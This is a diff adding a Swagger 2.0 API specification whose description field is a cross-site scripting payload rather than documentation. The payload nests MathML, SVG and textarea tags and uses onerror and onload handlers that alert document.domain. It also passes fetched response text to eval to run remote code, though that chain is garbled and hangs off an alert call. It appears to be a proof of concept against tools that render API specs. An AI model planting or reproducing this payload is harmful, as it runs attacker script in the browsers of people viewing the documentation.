@@ -1,0 +1,50 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |
+    <math>
+      <mtext>
+        <h1>
+          <a>
+            <h6></a></h6>
+            <mglyph>
+              <svg>
+                <mtext>
+                  <textarea>
+                    <a title='
+                      </textarea>
+                      <img src=x onerror=alert(document.domain))
+                      .then(function(res){
+                        res.text().then(function(data){
+                          eval(data)
+                        })
+                      })>'><svg/onload=alert(document.domain)
+                    </textarea>
+                  </h1>">
+                </textarea>
+              </mtext>
+            </svg>
+          </mglyph>
+        </a>
+      </mtext>
+    </math>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /accounts:
+    get:
+      summary: "Account information"
+      description: "Returns account details."
+      responses:
+        '200':
+          description: "Successful retrieval of account information"
+          schema:
+            type: object
